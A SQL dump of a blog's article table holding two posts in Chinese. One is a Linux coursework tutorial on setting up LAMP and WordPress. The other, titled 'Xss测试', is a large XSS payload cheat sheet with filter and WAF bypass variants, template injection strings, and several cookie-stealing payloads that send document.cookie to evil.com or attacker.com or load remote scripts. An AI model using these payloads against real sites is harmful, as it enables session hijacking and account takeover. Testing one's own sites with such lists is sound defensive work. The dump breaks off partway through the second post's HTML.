INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (65, 'Xss测试', 'xss-test-all', '测试xss', '## 一、基础经典向量（必测）\n&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n&lt;script&gt;alert(\'XSS\')&lt;/script&gt;\n&lt;img src=x onerror=alert(1)&gt;\n&lt;img src=\"invalid\" onerror=\"alert(1)\"&gt;\n&lt;svg onload=alert(1)&gt;\n&lt;body onload=alert(1)&gt;\n&lt;input onfocus=alert(1) autofocus&gt;\n&lt;iframe src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;\n&lt;a href=\"javascript:alert(1)\"&gt;click&lt;/a&gt;\n&lt;details open ontoggle=alert(1)&gt;\n&lt;marquee onstart=alert(1)&gt;\n&lt;video src=x onerror=alert(1)&gt;\n&lt;audio src=x onerror=alert(1)&gt;\n\n## 二、事件驱动 & 动态属性（大量可用事件）\n&lt;div onmouseover=alert(1)&gt;hover&lt;/div&gt;\n&lt;div onmouseenter=alert(1)&gt;hover&lt;/div&gt;\n&lt;div onclick=alert(1)&gt;click&lt;/div&gt;\n&lt;div ondbclick=alert(1)&gt;double&lt;/div&gt;\n&lt;div oncontextmenu=alert(1)&gt;right click&lt;/div&gt;\n&lt;input onkeyup=alert(1) autofocus&gt;\n&lt;body onpageshow=alert(1)&gt;\n&lt;body onhashchange=alert(1)&gt;\n&lt;svg onload=alert(1)&gt;\n&lt;svg onunload=alert(1)&gt;\n&lt;object onerror=alert(1)&gt;\n&lt;embed src=\"javascript:alert(1)\"&gt;\n&lt;math onload=alert(1)&gt;\n&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;\n&lt;textarea onfocus=alert(1) autofocus&gt;\n&lt;select onfocus=alert(1) autofocus&gt;\n\n## 三、大小写混淆与双写绕过（WAF绕过常用）\n&lt;ScRiPt&gt;alert(1)&lt;/sCriPt&gt;\n&lt;Img SrC=x OnErRoR=alert(1)&gt;\n&lt;svg/onload=alert(1)&gt;\n&lt;ScRipt&gt;alert(1)&lt;/sCRipT&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;\n&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;\"&gt;\n\n## 四、伪协议与JavaScript执行\njavascript:alert(1)\njavascript:alert(document.cookie)\njavascript:alert(1)//\njavascript:/* comment */ alert(1)\ndata:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\nvbscript:msgbox(1)   &lt;!-- IE only --&gt;\n\n## 五、编码绕过（HTML实体、Unicode、十六进制）\n&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;\n&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\n&lt;img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\"&gt;\n&lt;svg onload=&#97;&#108;&#101;&#114;&#116;(1)&gt;\njavascript:alert(\'\\x58\\x53\\x53\')\n&lt;a href=\"javascript:alert(String.fromCharCode(88,83,83))\"&gt;click&lt;/a&gt;\n\n## 六、闭合与上下文注入（针对已有属性/标签）\n\" onmouseover=alert(1) \"\n\' onfocus=alert(1) autofocus \'\n&gt;&lt;img src=x onerror=alert(1)&gt;\n\"&gt;&lt;svg/onload=alert(1)&gt;\n\';alert(1);//\n&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n\n## 七、短小精悍（极短Payload，适合长度限制）\n&lt;svg/onload=alert(1)&gt;\n&lt;img/src=x onerror=alert(1)&gt;\n&lt;body/onload=alert(1)&gt;\n&lt;q/oncut=alert(1)&gt;\n&lt;iframe/src=\"javascript:alert(1)\"&gt;\n\n## 八、HTML5 & 现代标签/属性\n&lt;math&gt;&lt;maction actiontype=\"statusline\" xlink:href=\"javascript:alert(1)\"&gt;click&lt;/maction&gt;&lt;/math&gt;\n&lt;embed src=\"javascript:alert(1)\"&gt;\n&lt;object data=\"javascript:alert(1)\"&gt;&lt;/object&gt;\n&lt;form&gt;&lt;button formaction=\"javascript:alert(1)\"&gt;click&lt;/button&gt;&lt;/form&gt;\n&lt;input type=\"image\" src=x onerror=alert(1)&gt;\n&lt;isindex type=image src=1 onerror=alert(1)&gt;\n&lt;iframe srcdoc=\"&lt;svg/onload=alert(1)&gt;\"&gt;\n\n## 九、Script上下文 & 动态代码执行\n&lt;script&gt;eval(\'alert(1)\')&lt;/script&gt;\n&lt;script&gt;setTimeout(\'alert(1)\',0)&lt;/script&gt;\n&lt;script&gt;setInterval(\'alert(1)\',100)&lt;/script&gt;\n&lt;script&gt;Function(\'alert(1)\')()&lt;/script&gt;\n&lt;script&gt;new Function`alert(1)`()&lt;/script&gt;\n&lt;script&gt;window[\'alert\'](1)&lt;/script&gt;\n&lt;script&gt;setTimeout(\"alert(1)\")&lt;/script&gt;\n\n## 十、DOM型 XSS 测试（针对document.write/innerHTML/location等）\n&lt;script&gt;document.write(\'&lt;img src=x onerror=alert(1)&gt;\')&lt;/script&gt;\n&lt;script&gt;document.getElementById(\'test\').innerHTML=\'&lt;img src=x onerror=alert(1)&gt;\'&lt;/script&gt;\n#&lt;img src=x onerror=alert(1)&gt;\njavascript:alert(1)#\n\"&gt;&lt;img src=x onerror=alert(1)&gt;\n\n## 十一、CSP绕过尝试（特定环境）\n&lt;link rel=\"import\" href=\"javascript:alert(1)\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0;javascript:alert(1)\"&gt;\n&lt;script&gt;window.location=\'https://attacker.com/steal?c=\'+document.cookie&lt;/script&gt;\n&lt;script&gt;$.getScript(\'https://evil.com/xss.js\')&lt;/script&gt;   &lt;!-- 依赖jQuery --&gt;\n\n## 十二、窃取Cookie & 外带数据（测试交互能力）\n&lt;script&gt;document.location=\'http://evil.com/steal?c=\'+document.cookie&lt;/script&gt;\n&lt;img src=x onerror=\"fetch(\'http://evil.com?c=\'+document.cookie)\"&gt;\n&lt;script&gt;new Image().src=\'http://evil.com?c=\'+document.cookie&lt;/script&gt;\n&lt;script&gt;navigator.sendBeacon(\'http://evil.com\', document.cookie)&lt;/script&gt;\n\n## 十三、特殊字符及浏览器差异性\n%3Cscript%3Ealert(1)%3C/script%3E   &lt;!-- URL编码 --&gt;\n&lt;scr%00ipt&gt;alert(1)&lt;/scr%00ipt&gt;     &lt;!-- 空字节绕过（罕见） --&gt;\n&lt;scr\\x00ipt&gt;alert(1)&lt;/scr\\x00ipt&gt;\n\n## 十四、反射型/存储型通用测试字符串\n\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n\';alert(1);//\n&lt;img src=x onerror=alert(1)&gt;\n&lt;svg/onload=alert(1)&gt;\n{{constructor.constructor(\'alert(1)\')()}}   &lt;!-- AngularJS / 模板引擎 --&gt;\n${alert(1)}                                 &lt;!-- 模板注入 --&gt;', '<h2 id=\"一基础经典向量必测\">一、基础经典向量（必测）</h2>\n<p>&lt;script&gt;alert(1)&lt;/script&gt;<br>\n&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>\n&lt;script&gt;alert(\'XSS\')&lt;/script&gt;<br>\n&lt;img src=x onerror=alert(1)&gt;<br>\n&lt;img src=&quot;invalid&quot; onerror=&quot;alert(1)&quot;&gt;<br>\n&lt;svg onload=alert(1)&gt;<br>\n&lt;body onload=alert(1)&gt;<br>\n&lt;input onfocus=alert(1) autofocus&gt;<br>\n&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;<br>\n&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;<br>\n&lt;details open ontoggle=alert(1)&gt;<br>\n&lt;marquee onstart=alert(1)&gt;<br>\n&lt;video src=x onerror=alert(1)&gt;<br>\n&lt;audio src=x onerror=alert(1)&gt;</p>\n<h2 id=\"二事件驱动--动态属性大量可用事件\">二、事件驱动 &amp; 动态属性（大量可用事件）</h2>\n<p>&lt;div onmouseover=alert(1)&gt;hover&lt;/div&gt;<br>\n&lt;div onmouseenter=alert(1)&gt;hover&lt;/div&gt;<br>\n&lt;div onclick=alert(1)&gt;click&lt;/div&gt;<br>\n&lt;div ondbclick=alert(1)&gt;double&lt;/div&gt;<br>\n&lt;div oncontextmenu=alert(1)&gt;right click&lt;/div&gt;<br>\n&lt;input onkeyup=alert(1) autofocus&gt;<br>\n&lt;body onpageshow=alert(1)&gt;<br>\n&lt;body onhashchange=alert(1)&gt;<br>\n&lt;svg onload=alert(1)&gt;<br>\n&lt;svg onunload=alert(1)&gt;<br>\n&lt;object onerror=alert(1)&gt;<br>\n&lt;embed src=&quot;javascript:alert(1)&quot;&gt;<br>\n&lt;math onload=alert(1)&gt;<br>\n&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;<br>\n&lt;textarea onfocus=alert(1) autofocus&gt;<br>\n&lt;select onfocus=alert(1) autofocus&gt;</p>\n<h2 id=\"三大小写混淆与双写绕过waf绕过常用\">三、大小写混淆与双写绕过（WAF绕过常用）</h2>\n<p>&lt;ScRiPt&gt;alert(1)&lt;/sCriPt&gt;<br>\n&lt;Img SrC=x OnErRoR=alert(1)&gt;<br>\n&lt;svg/onload=alert(1)&gt;<br>\n&lt;ScRipt&gt;alert(1)&lt;/sCRipT&gt;<br>\n&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;<br>\n&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;<br>\n&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;&quot;&gt;</p>\n<h2 id=\"四伪协议与javascript执行\">四、伪协议与JavaScript执行</h2>\n<p>javascript:alert(1)<br>\njavascript:alert(document.cookie)<br>\njavascript:alert(1)//<br>\njavascript:/* comment */ alert(1)<br>\ndata:text/html,&lt;script&gt;alert(1)&lt;/script&gt;<br>\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==<br>\nvbscript:msgbox(1)   &lt;!-- IE only --&gt;</p>\n<h2 id=\"五编码绕过html实体unicode十六进制\">五、编码绕过（HTML实体、Unicode、十六进制）</h2>\n<p>&lt;script&gt;alert(1)&lt;/script&gt;<br>\n&lt;script&gt;alert(1)&lt;/script&gt;<br>\n&lt;img src=x onerror=&quot;alert(1)&quot;&gt;<br>\n&lt;svg onload=alert(1)&gt;<br>\njavascript:alert(\'\\x58\\x53\\x53\')<br>\n&lt;a href=&quot;javascript:alert(String.fromCharCode(88,83,83))&quot;&gt;click&lt;/a&gt;</p>\n<h2 id=\"六闭合与上下文注入针对已有属性标签\">六、闭合与上下文注入（针对已有属性/标签）</h2>\n<p>&quot; onmouseover=alert(1) &quot;<br>\n\' onfocus=alert(1) autofocus \'<br>\n&gt;&lt;img src=x onerror=alert(1)&gt;<br>\n&quot;&gt;&lt;svg/onload=alert(1)&gt;<br>\n\';alert(1);//<br>\n&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br>\n--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p>\n<h2 id=\"七短小精悍极短payload适合长度限制\">七、短小精悍（极短Payload，适合长度限制）</h2>\n<p>&lt;svg/onload=alert(1)&gt;<br>\n&lt;img/src=x onerror=alert(1)&gt;<br>\n&lt;body/onload=alert(1)&gt;<br>\n&lt;q/oncut=alert(1)&gt;<br>\n&lt;iframe/src=&quot;javascript:alert(1)&quot;&gt;</p>\n<h2 id=\"八html5--现代标签属性\">八、HTML5 &amp; 现代标签/属性</h2>\n<p>&lt;math&gt;&lt;maction actiontype=&quot;statusline&quot; xlink:href=&quot;javascript:alert(1)&quot;&gt;click&lt;/maction&gt;&lt;/math&gt;<br>\n&lt;embed src=&quot;javascript:alert(1)&quot;&gt;<br>\n&lt;object data=&quot;javascript:alert(1)&quot;&gt;&lt;/object&gt;<br>\n&lt;form&gt;&lt;button formaction=&quot;javascript:alert(1)&quot;&gt;click&lt;/button&gt;&lt;/form&gt;<br>\n&lt;input type=&quot;image&quot; src=x onerror=alert(1)&gt;<br>\n&lt;isindex type=image src=1 onerror=alert(1)&gt;<br>\n&lt;iframe srcdoc=&quot;&lt;svg/onload=alert(1)&gt;&quot;&gt;</p>\n<h2 id=\"九script上下文--动态代码执行\">九、Script上下文 &amp; 动态代码执行</h2>\n<p>&lt;script&gt;eval(\'alert(1)\')&lt;/script&gt;<br>\n&lt;script&gt;setTimeout(\'alert(1)\',0)&lt;/script&gt;<br>\n&lt;script&gt;setInterval(\'alert(1)\',100)&lt;/script&gt;<br>\n&lt;script&gt;Function(\'alert(1)\')()&lt;/script&gt;<br>\n&lt;script&gt;new Function<code>alert(1)</code>()&lt;/script&gt;<br>\n&lt;script&gt;window<a href=\"1\">\'alert\'</a>&lt;/script&gt;<br>\n&lt;script&gt;setTimeout(&quot;alert(1)&quot;)&lt;/script&gt;</p>\n<h2 id=\"十dom型-xss-测试针对documentwriteinnerhtmllocation等\">十、DOM型 XSS 测试（针对document.write/innerHTML/location等）</h2>\n<p>&lt;script&gt;document.write(\'&lt;img src=x onerror=alert(1)&gt;\')&lt;/script&gt;<br>\n&lt;script&gt;document.getElementById(\'test\').innerHTML=\'&lt;img src=x onerror=alert(1)&gt;\'&lt;/script&gt;<br>\n#&lt;img src=x onerror=alert(1)&gt;<br>\njavascript:alert(1)#<br>\n&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</p>\n<h2 id=\"十一csp绕过尝试特定环境\">十一、CSP绕过尝试（特定环境）</h2>\n<p>&lt;link rel=&quot;import&quot; href=&quot;javascript:alert(1)&quot;&gt;<br>\n&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript:alert(1)&quot;&gt;<br>\n&lt;script&gt;window.location=\'<a href=\"https://attacker.com/steal?c=\'+document.cookie\">https://attacker.com/steal?c=\'+document.cookie</a>&lt;/script&gt;<br>\n&lt;script&gt;$.getScript(\'<a href=\"https://evil.com/xss.js\">https://evil.com/xss.js</a>\')&lt;/script&gt;   &lt;!-- 依赖jQuery --&gt;</p>\n<h2 id=\"十二窃取cookie--外带数据测试交互能力\">十二、窃取Cookie &amp; 外带数据（测试交互能力）</h2>\n<p>&lt;script&gt;document.location=\'<a href=\"http://evil.com/steal?c=\'+document.cookie\">http://evil.com/steal?c=\'+document.cookie</a>&lt;/script&gt;<br>\n&lt;img src=x onerror=&quot;fetch(\'<a href=\"http://evil.com?c=\'+document.cookie\">http://evil.com?c=\'+document.cookie</a>)&quot;&gt;<br>\n&lt;script&gt;new Image().src=\'<a href=\"http://evil.com?c=\'+document.cookie\">http://evil.com?c=\'+document.cookie</a>&lt;/script&gt;<br>\n&lt;script&gt;navigator.sendBeacon(\'<a href=\"http://evil.com\">http://evil.com</a>\', document.cookie)&lt;/script&gt;</p>\n<h2 id=\"十三特殊字符及浏览器差异性\">十三、特殊字符及浏览器差异性</h2>\n<p>%3Cscript%3Ealert(1)%3C/script%3E   &lt;!-- URL编码 --&gt;<br>\n&lt;scr%00ipt&gt;alert(1)&lt;/scr%00ipt&gt;     &lt;!-- 空字节绕过（罕见） --&gt;<br>\n&lt;scr\\x00ipt&gt;alert(1)&lt;/scr\\x00ipt&gt;</p>\n<h2 id=\"十四反射型存储型通用测试字符串\">十四、反射型/存储型通用测试字符串</h2>\n<p>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br>\n\';alert(1);//<br>\n&lt;img src=x onerror=alert(1)&gt;<br>\n&lt;svg/onload=alert(1)&gt;<br>\n{{constructor.constructor(\'alert(1)\')()}}   &lt;!-- AngularJS / 模板引擎 --&gt;<br>\n${alert(1)}                                 &lt;!-- 模板注入 --&gt;</p>\n', 'https://lilicould.cn:8888/uploads/2b2d5faf-4fe8-4f0c-b850-81d16ae0041b.png', 1, 39, 2, '2026-04-07 13:15:56', '2026-05-19 10:18:49', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (66, 'linux大作业', 'linux-work', 'linux大作业，内容为搭建LMAP平台。', '# Linux大作业操作流程\n\n> 大作业要求搭建LMAP平台并在LMAP平台上部署WordPress\n\n---\n\n## LMAP说明\n\n| 名称 | 对应    | 说明                               |\n| ---- | ------- | ---------------------------------- |\n| L    | Linux   | 操作系统                           |\n| M    | MariaDB | 数据库                             |\n| A    | Apache2 | 高性能Web服务器，处理HTTP请求      |\n| P    | PHP     | 服务器端脚本语言，用于生成动态内容 |\n\n总的来说，LAMP 就是一套完整的网站运行环境：Linux 做系统底层，Apache 负责接收用户访问并对外提供网页，MariaDB 存储网站所有数据，PHP 负责处理逻辑、连接数据库并生成最终页面。四者配合让 WordPress、phpBB、DVWA 这类 PHP 网站程序能够正常安装、运行和被访问。本次作业内容为安装WordPress测试。\n\n---\n\n## LMAP安装\n\n### Linux\n\nLinux在课程初已经安装过，常见的有三种方式\n\n1. 通过云服务商（如阿里云，腾讯云）购买服务器一键安装Linux\n2. 本地使用虚拟机进行安装\n3. 直接在物理机安装（一般较少）\n   实际上如果真实安装LMAP一般是要对外提供服务的，那一般都是使用云服务的。对于大作业，直接使用虚拟机安装。\n   Linux有很多发行版，如centos,debian,redhat,archlinux,ubuntu等等，这里使用debian 13。\n\n### 其他三个环境\n\n安装完Linux之后，为了网络通畅，建议配置包管理器的安装源为国内源，如清华源，中科大源，阿里源等。配置过程不赘述。\n然后我们先更新一下包管理器的软件源，确保下载的是最新的源；再更新自己本地安装的所有软件，避免造成一些版本不兼容的问题。使用以下代码一键执行：\n\n```bash\nsudo apt update && sudo apt upgrade\n```\n\nsudo 代表使用超级用户权限。\n然后就可以通过下面指令一键安装其他三个环境了：\n\n```bash\nsudo apt install apache2 mariadb-server php php-mysql libapache2-mod-php\n```\n\n其中php-mysql是PHP连接 MySQL/MariaDB 的驱动，libapache2-mod-php是Apache和 PHP的连接器，让Apache能调用PHP处理页面。\n之所以要安装libapache2-mod-php是因为Apache默认只能处理静态页面，自然也无法调用数据库。安装libapache2-mod-php使得Apache能够调用PHP从而可以实现动态页面。\n\n#### 测试Apache安装是否成功\n\n打开自己浏览器访问127.0.0.1,如果看到以下页面，说明安装成功。\n\n![](https://oss.lilicould.cn/file/5e38b655-4f34-40ad-9836-44a36816794f_image.png)\n如果没装图形化界面，当然也可以通过主机访问虚拟机网络，这里也可以使用wget指令\n`wget 127.0.0.1`获取到HTML文件，然后查看文件也可以验证是否安装成功。\n\n![](https://oss.lilicould.cn/file/49a7d3e8-c79f-4bd2-b974-b5bbd8e566f5_image.png)\n\n#### 测试PHP是否安装成功\n\n验证PHP是否成功，只要看访问页面时候PHP的API有没有成功调用就好了。我们到Apache的静态页面目录下创建一个test.php，然后写入测试代码，然后按照测试Apache的步骤访问127.0.0.1/test.php查看页面是否渲染成功之后就可以了。\n接下来一步步展示\n\n1. 进入静态页面目录 `cd /var/www/html`\n2. 创建test.php `sudo touch test.php`\n3. 使用自己喜欢的编辑器（vi,vim,nano等）写入测试代码\n\n```PHP\n<?php\n  phpinfo();\n?>\n```\n\n4. 访问127.0.0.1/test.php,如果出现以下类似页面，说明安装成功\n\n![](https://oss.lilicould.cn/file/c015e3a5-31dd-49d0-80d6-a8c9388a21ce_image.png)\n\n#### 测试MariaDB是否安装成功\n\n连接mariadb,指令和MySQL几乎一致，使用root用户连接\n\n```bash\nsudo mariadb -u root -p\n```\n\n![](https://oss.lilicould.cn/file/36e94368-070b-4c66-926b-f716bb97237a_image.png)\n第一次的密码是Linux超级用户的密码，不加sudo就不会提示，第二次密码是提示输入数据库root用户的密码，由于现在还没有设置，所以密码为空，直接回车即可。\n随后如果输出了welcom，说明正常连接了。\n\n![](https://oss.lilicould.cn/file/4028f714-4c4f-4ce7-8852-3deede4e7626_image.png)\n接下来输入 `show databases;`展示数据库。\n\n![](https://oss.lilicould.cn/file/485efc55-2d4f-413e-acc8-d81f2350c2e3_image.png)\n当看到这个页面时候说明数据库完美的安装了，没有任何问题，现在我们的环境都安装好了。\n\n---\n\n## 配置MariaDB\n\n但是我们的MariaDB现在还没有任何配置，包括root账户的密码，这显然是不合适的。并且我们实际使用中显然也不会直接使用root用户，所以我们需要创建一个新的数据库用户，并为这个用户创建一个数据库供我们接下来要安装的WordPress使用。\n接下来展示用户和数据库的创建与授权，root用户的密码可以不配置，如想配置可以自行配置或者查看[MariaDB初始用户密码配置](https://lilicould.cn/article/67)。\n\n### 创建用户\n\n```sql\ncreate user yourName@localhost identified by \'yourPassword\'\n```\n\n其中@localhost表示这个用户只能本地连接，远程主机访问会拒绝，如果需要远程连接可以指定能连接的ip或直接使用通配符 `%`，但这样显然不安全。我们的数据库和使用环境在同一个主机，直接使用localhost不会有任何问题。\n**yourName和yourNmae注意替换为自己设置的用户名和密码**\n密码可以按照老师教的使用古诗的拼音，也可以选择自己喜欢的密码。这里因为是在虚拟机上，就直接使用 `123456`了\n\n### 创建数据库并授权\n\n```sql\ncreate database yourDatabaseName;\ngrant all privileges on yourDatabaseName.* to yourname@localhost;\nflush privileges;\n```\n\n第一条指令是创建一个名为 `yourDatabaseName`的数据库，实际中请改为自己的，这里我直接使用 `wordpress`作为数据库名。\n第二条指令为把这个数据库的所有权限给予我们刚刚创建的用户。\n`all privileges`代表所有权限，`yourDatabaseName.*`代表这个数据库的所有表。\n第三条指令作用是让数据库立刻加载最新的用户、密码、权限配置，保证授权生效。\n\n### 验证配置是否生效\n\n我们可以使用exit关闭数据库连接，然后重新使用刚刚创建的用户连接检查是否能够成功连接，再展示所有数据库验证。\n登陆指令和登陆root用户一样，将root改为刚刚创建的用户名即可。\n登陆指令 `mariadb -u yourName -p`\n登陆后输入 `show databases;`\n\n![](https://oss.lilicould.cn/file/3326e407-d412-4482-8635-c5e24a2280ac_image.png)\n可以发现出现的数据库少了，这是因为这个用户只有刚刚授权的数据库权限，我这里数据库名是 `wordpress`。至于另一个 `information_schema`数据库，这是MariaDB的系统数据库，存储了数据库的信息，无需理会。\n到这里我们就完成了PHP动态网站平台的搭建，接下来就可以安装部署WordPress了。\n\n---\n\n## 安装部署WordPress\n\nwordpress官网提供了详细了说明，当然可以查阅[官网安装教程](https://developer.wordpress.org/advanced-administration/before-install/howto-install/)学习如何安装,但是官网教程是英文的，而且国内网络正常访问可能会有一点卡。如果不想看官网教程可以直接根据下面的步骤执行。\n\n### 下载WordPess\n\n下载方式有很多，可以直接去官网找到下载按钮下载，这里我们选择使用wget直接从官网下载地址安装。我们先进入到 `/var/www.html`目录（后续解压也要解压到这里，为了方便就直接进入这个目录操作），然后进行安装，具体操作展示：\n\n1. 进入 `/var/www/html`目录\n\n```bash\ncd /var/www/html\n```\n\n2. 下载WordPress\n\n```bash\nsudo wget https://wordpress.org/latest.tar.gz\n```\n\n![](https://oss.lilicould.cn/file/3f757ee8-8bac-4d44-a499-9ab0791688dc_image.png)\n\n可以看到我们成功下载了WordPress,然后直接解压就可以了。\n直接在控制台中输入 `sudo tar -xzvf latest.tar.gz`解压，然后输入ls我们就应该可以看到在目录 `/var/www/html`目录下多出了wordpress目录\n\n![](https://oss.lilicould.cn/file/043f81e5-036e-4b3f-8528-8716dd9a3ead_image.png)\n\n### 测试wordpress安装\n\n接下来我们直接访问 `127.0.0.1/wordpress`应该就会出现以下界面\n\n![](https://oss.lilicould.cn/file/0aeaffa3-d82a-4d71-a5e1-d2324144d1a0_image.png)\n这说明我们的wordpress确实安装成功了，接下来需要对其进行配置。\n\n### 配置WordPress权限\n\n我们需要把敢刚解压得到的 `wordpress`目录的所有者设置为 `www-data`。\nwww-data 是 Linux 系统里的一个系统用户 / 用户组。\n安装 Apache，系统会自动创建它，Apache 运行时，就是以www-data身份在跑，PHP也是跟着Apache一起，用 www-data 运行。\n所以我们必须要把 `wordpress`目录的所有者设置为 `www-data`,这样服务器才有权限对其执行读写操作。\n当然不论能不能理解这些都不重要，我们只需要明白现在必须执行一个指令：\n\n```bash\nsudo chown -R www-data:www-data /var/www/html/wordpress\n```\n\n其中 `chown`的意思是改变所有者，`-R`代表递归设置，`www-data:www-data`中冒号前面的代表用户，冒号后面的代表用户组\n\n### WordPress其他配置\n\n给予了权限之后，我们能重新访问[127.0.0.1/wordpress](127.0.0.1/wordpress)就可以对wordpress进行配置了。\n\n### 语言配置\n\n我们选择语言为中文，点击继续\n\n![](https://oss.lilicould.cn/file/5fe697d4-a049-4445-a11e-906311f6d516_image.png)\n\n### 数据库配置\n\n然后就会跳转数据库配置。\n\n![](https://oss.lilicould.cn/file/4d21655a-18f9-4816-89ea-31aba00afad3_image.png)\n数据库名为刚刚配置MariaDB时候的配置，这里我的是 `wordpress`，同样的，用户名和密码也是刚刚安装Maria时候配置的，数据库主机和表前缀使用默认的 `localhost`和 `wp_`就可以了。\n\n### 站点信息配置\n\n接下来我们点击提交后提示我们已经准备就绪了，继续就可以了。\n再接下来就会提示我们配置网站信息，按照自己个性填写就好了。\n\n![](https://oss.lilicould.cn/file/e4b1370b-f8b4-49e5-9a59-7604043d4dcd_image.png)\n填写后点击 `安装WordPress`就可以了。\n注意这里的用户名和密码**一定要记住**，这是网站的管理员账号密码。\n\n### 登陆WordPress\n\n完成了所有的配置之后就会提示我们去登陆了，使用刚刚配置的管理员账号密码登陆后台就可以了。登陆后就能看到WordPress的后台了。\n\n![](https://oss.lilicould.cn/file/546859bd-eda4-4891-9cf3-777b3d88eebc_image.png)\n\n---\n\n### 一些问题\n\n#### 文章内容无法访问\n\n如果出现404，有可能是因为链接格式的问题，可以去仪表盘设置里面把链接格式改为 `朴素`\n\n![](https://oss.lilicould.cn/file/dbe2064c-0c1d-42f0-a40b-5b9916ccaedb_image.png)\n改为朴素后一定要记得保存修改。\n\n### 测试\n\n#### 文字blog\n\n![](https://oss.lilicould.cn/file/d3511ef5-466c-4778-9a02-8540f05b644a_image.png)\n\n#### 图片blog\n\n![](https://oss.lilicould.cn/file/06f2a8e3-4b88-477d-9382-e5239a02453e_image.png)\n\n---\n\n## 结束\n\n到这里我们就完成了大作业的基本内容，然后我们通过WordPress后台对网站进行个性化设计就可以了。\n', '<h1 id=\"linux大作业操作流程\">Linux大作业操作流程</h1>\n<blockquote>\n  <p>大作业要求搭建LMAP平台并在LMAP平台上部署WordPress</p>\n</blockquote>\n<hr />\n<h2 id=\"lmap说明\">LMAP说明</h2>\n<table>\n  <thead>\n    <tr><th>名称</th><th>对应</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>L</td><td>Linux</td><td>操作系统</td></tr>\n    <tr><td>M</td><td>MariaDB</td><td>数据库</td></tr>\n    <tr><td>A</td><td>Apache2</td><td>高性能Web服务器，处理HTTP请求</td></tr>\n    <tr><td>P</td><td>PHP</td><td>服务器端脚本语言，用于生成动态内容</td></tr>\n  </tbody>\n</table>\n<p>总的来说，LAMP 就是一套完整的网站运行环境：Linux 做系统底层，Apache 负责接收用户访问并对外提供网页，MariaDB 存储网站所有数据，PHP 负责处理逻辑、连接数据库并生成最终页面。四者配合让 WordPress、phpBB、DVWA 这类 PHP 网站程序能够正常安装、运行和被访问。本次作业内容为安装WordPress测试。</p>\n<hr />\n<h2 id=\"lmap安装\">LMAP安装</h2>\n<h3 id=\"linux\">Linux</h3>\n<p>Linux在课程初已经安装过，常见的有三种方式</p>\n<ol>\n  <li>通过云服务商（如阿里云，腾讯云）购买服务器一键安装Linux</li>\n  <li>本地使用虚拟机进行安装</li>\n  <li>直接在物理机安装（一般较少）<br>\n    实际上如果真实安装LMAP一般是要对外提供服务的，那一般都是使用云服务的。对于大作业，直接使用虚拟机安装。<br>\n    Linux有很多发行版，如centos,debian,redhat,archlinux,ubuntu等等，这里使用debian 13。</li>\n</ol>\n<h3 id=\"其他三个环境\">其他三个环境</h3>\n<p>安装完Linux之后，为了网络通畅，建议配置包管理器的安装源为国内源，如清华源，中科大源，阿里源等。配置过程不赘述。<br>\n然后我们先更新一下包管理器的软件源，确保下载的是最新的源；再更新自己本地安装的所有软件，避免造成一些版本不兼容的问题。使用以下代码一键执行：</p>\n<pre><code class=\"language-bash\">sudo apt update &amp;&amp; sudo apt upgrade\n</code></pre>\n<p>sudo 代表使用超级用户权限。<br>\n然后就可以通过下面指令一键安装其他三个环境了：</p>\n<pre><code class=\"language-bash\">sudo apt install apache2 mariadb-server php php-mysql libapache2-mod-php\n</code></pre>\n<p>其中php-mysql是PHP连接 MySQL/MariaDB 的驱动，libapache2-mod-php是Apache和 PHP的连接器，让Apache能调用PHP处理页面。<br>\n之所以要安装libapache2-mod-php是因为Apache默认只能处理静态页面，自然也无法调用数据库。安装libapache2-mod-php使得Apache能够调用PHP从而可以实现动态页面。</p>\n<h4 id=\"测试apache安装是否成功\">测试Apache安装是否成功</h4>\n<p>打开自己浏览器访问127.0.0.1,如果看到以下页面，说明安装成功。</p>\n<p><img src=\"https://oss.lilicould.cn/file/5e38b655-4f34-40ad-9836-44a36816794f_image.png\" alt=\"\" /><br>\n如果没装图形化界面，当然也可以通过主机访问虚拟机网络，这里也可以使用wget指令<br>\n<code>wget 